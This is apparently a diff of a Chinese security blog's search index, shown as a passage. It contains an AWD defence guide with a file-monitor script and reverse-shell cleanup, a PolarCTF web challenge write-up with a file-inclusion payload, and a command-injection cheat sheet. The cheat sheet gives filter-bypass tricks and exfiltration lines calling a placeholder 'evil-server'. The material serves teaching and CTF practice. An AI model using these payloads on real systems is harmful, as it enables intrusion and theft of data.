class="string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 防止任意文件被修改,还原被修改文件</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filekey, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime())</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python jiankong.py  /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>文件监控脚本：<br><a href="https://www.ctfiot.com/go/?url=aHR0cHM6Ly9naXRodWIuY29tL1RoZUtpbmdPZkR1Y2svRmlsZU1vbml0b3I=">https://github.com/TheKingOfDuck/FileMonitor</a></p>
+<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>相当于你给自己的网站上防火墙</p>
+<p>推荐使用<a href="https://github.com/leohearts/awd-watchbird">watchbird</a></p>
+<p>使用命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php watchbird.php --install /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>运行waf 之后，在网址加上**?watchbird=ui**，就会进入到waf 配置页面然后设置密码</p>
+<p>github上有使用教程</p>
+<h2 id="清除反弹shell"><a href="#清除反弹shell" class="headerlink" title="清除反弹shell"></a>清除反弹shell</h2><p>查看进程</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef / px -aux</span><br></pre></td></tr></table></figure>
+
+<p>出现www-data权限的/bin/sh一般为nc</p>
+<p>然后杀进程</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> `ps -aux | grep www-data | grep apache2 | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>win系统</category>
+        <category>AWD</category>
       </categories>
       <tags>
-        <tag>win10</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>win10报错</title>
-    <url>/posts/9ffa43eb.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在使用计算机时，因为我们自己的骚操作会产生一些奇奇怪怪的报错。因此特此积累一下自己所遇到的报错。也方便自己下次可以自己解决，也方便他人解决。</p>
-<h1 id="各种报错"><a href="#各种报错" class="headerlink" title="各种报错"></a>各种报错</h1><h2 id="Windows-PowerShell"><a href="#Windows-PowerShell" class="headerlink" title="Windows PowerShell"></a>Windows PowerShell</h2><h3 id="显示找不到快捷文件"><a href="#显示找不到快捷文件" class="headerlink" title="显示找不到快捷文件"></a>显示找不到快捷文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将C盘用户里面Default”这个用户（win10系统的默认账号）的Windows PowerShell复制到你的用下相同的目录下即可。</span><br><span class="line"></span><br><span class="line">目录</span><br><span class="line">C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>win系统</category>
-      </categories>
-      <tags>
-        <tag>win10</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>命令执行漏洞</title>
-    <url>/posts/a43e8dc0.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
-<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
-<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
-
-<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
-
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
-
-<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<p>Linux下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
-
-<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
-
-<p>liunx绕开空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
-
-<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
-
-<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
-
-<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
-<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
-
-<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
-
-<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>漏洞利用</tag>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1735,6 +1903,120 @@
       </tags>
   </entry>
   <entry>
+    <title>win10报错</title>
+    <url>/posts/9ffa43eb.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在使用计算机时，因为我们自己的骚操作会产生一些奇奇怪怪的报错。因此特此积累一下自己所遇到的报错。也方便自己下次可以自己解决，也方便他人解决。</p>
+<h1 id="各种报错"><a href="#各种报错" class="headerlink" title="各种报错"></a>各种报错</h1><h2 id="Windows-PowerShell"><a href="#Windows-PowerShell" class="headerlink" title="Windows PowerShell"></a>Windows PowerShell</h2><h3 id="显示找不到快捷文件"><a href="#显示找不到快捷文件" class="headerlink" title="显示找不到快捷文件"></a>显示找不到快捷文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将C盘用户里面Default”这个用户（win10系统的默认账号）的Windows PowerShell复制到你的用下相同的目录下即可。</span><br><span class="line"></span><br><span class="line">目录</span><br><span class="line">C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>win系统</category>
+      </categories>
+      <tags>
+        <tag>win10</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Polarctf</title>
+    <url>/posts/f2bbe48e.html</url>
+    <content><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>打开靶机，有一个页面。需要你提交东西，但是提交按钮不能点击。</p>
+<p>查看页面源码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color:red&quot;</span>&gt;</span>我说我系签到题,你信吗<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>现在去获得flag吧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;9&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;qiandao&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">disabled</span>=<span class="string">&quot;disabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本题突破点在语言上，text限制长度9，去掉disabled就可以进行提交。先随便提交，页面会弹窗让你提交<strong>ilovejljcxy</strong>。即可得到flag</p>
+<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>源代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>解释</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一行设置错误报告级别为 0，这表示关闭错误和警告的显示。</span><br><span class="line">第二行获取名为 file 的 GET 请求参数，如果未定义则将其默认设置为 &#x27;1&#x27;。</span><br><span class="line">第三行使用 str_replace() 函数将请求参数中的 &quot;../&quot; 字符串替换为空字符串，以防止访问上层目录的文件。</span><br><span class="line">第四行使用 include_once() 函数包含指定文件。根据上面三行代码的处理，此处的 $file 只能是当前目录下的某个 PHP 文件，而不是其他目录或上层目录中的文件。</span><br><span class="line">最后一行使用 highlight_file() 函数在浏览器中显示当前 PHP 文件的源代码。</span><br><span class="line">需要注意的是，这段代码存在安全风险，因为它允许通过 URL 参数直接包含任何 PHP 文件，并在服务器上执行该文件。如果攻击者可以控制 file 参数，则可以利用这个漏洞来执行任意 PHP 代码。建议在生产环境中谨慎使用此类代码。</span><br></pre></td></tr></table></figure>
+
+<p><strong>解法</strong></p>
+<ol>
+<li>直接访问未经授权的文件：攻击者可以将 file 参数设置为其他目录或上层目录中的 PHP 文件名，直接访问未经授权的文件。</li>
+<li>绕过 ../ 过滤：攻击者可以通过使用双字节字符或 URL 编码等技术来绕过 str_replace() 函数中的 “../“ 过滤，进而访问上级目录中的文件。</li>
+<li>文件包含漏洞：如果攻击者能够控制 file 参数，并且在该参数中注入 PHP 代码，则可以利用文件包含漏洞执行任意 PHP 代码。例如，攻击者可以将 file 参数设置为 “php://input”，并在 POST 请求中发送一个带有 PHP 代码的数据包，从而成功执行恶意代码。</li>
+</ol>
+<p><strong>解题过程</strong></p>
+<p>1.打开页面</p>
+<blockquote>
+<p>我是一个什么都不会的出题人，我啥也不知道,我只知道你不是我可耐的弟弟-。-</p>
+</blockquote>
+<p>2.修改Cookie的Value值为yes。返回Li9kYXRhL2luZGV4LnBocA</p>
+<blockquote>
+<p>base64解码：./data/index.php</p>
+</blockquote>
+<p>3.得到路径，访问得到源码</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=....//....//....//....//flags</span><br></pre></td></tr></table></figure>
+
+<p>flag{92eb5ffee6ae2fec3ad71c777531578f}</p>
+<h1 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h1><p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;&#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);&#125;&#125;</span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="title function_ invoke__">no</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>highlight_file(__FILE__);</code>：使用 <code>highlight_file()</code> 函数显示当前文件（由 <code>__FILE__</code> 常量表示）的源代码，并为 PHP 代码添加语法高亮。这样可以让访问者查看此 PHP 脚本的源代码。</li>
+<li><code>function no($txt)&#123;...&#125;</code>：定义一个名为 <code>no</code> 的函数，接收一个名为 <code>$txt</code> 的参数。此函数用于检查 <code>$txt</code> 参数中是否包含某些字符串（这些字符串通常与系统命令有关），以防止潜在的安全风险。</li>
+<li><code>if(!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;, $txt))&#123;...&#125;</code>：使用 <code>preg_match()</code> 函数和正则表达式检查 <code>$txt</code> 参数中是否包含这些字符串。如果没有匹配项，将返回 <code>$txt</code>；否则，执行 <code>die(&quot;what&#39;s up&quot;);</code>，终止脚本执行并输出错误信息。</li>
+<li><code>$yyds=($_POST[&#39;yyds&#39;]);</code>：从 POST 请求中获取名为 <code>&#39;yyds&#39;</code> 的参数值并将其存储在 <code>$yyds</code> 变量中。</li>
+<li><code>if(isset($_GET[&#39;sys&#39;])&amp;&amp;$yyds==&#39;666&#39;)&#123;...&#125;</code>：检查是否存在名为 <code>&#39;sys&#39;</code> 的 GET 参数，并检查 <code>$yyds</code> 变量是否等于 <code>&#39;666&#39;</code>。如果这两个条件都满足，执行大括号内的代码。</li>
+<li><code>eval(no($_GET[&#39;sys&#39;]));</code>：在满足条件的情况下，获取 GET 请求中的 <code>&#39;sys&#39;</code> 参数值，传递给 <code>no()</code> 函数进行安全检查。如果安全检查通过，使用 <code>eval()</code> 函数执行该参数值中的 PHP 代码。</li>
+<li><code>else &#123;echo &quot;nonono&quot;;&#125;</code>：如果条件不满足，输出字符串 “nonono”。</li>
+</ol>
+<p>这段代码的主要目的是接收用户输入，并在满足一定条件且经过安全检查后，执行用户提供的 PHP 代码。同时，使用highlight_file()函数显示源代码，让访问者可以查看脚本的实现。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行漏洞</title>
+    <url>/posts/a43e8dc0.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
+<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<p>Linux下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
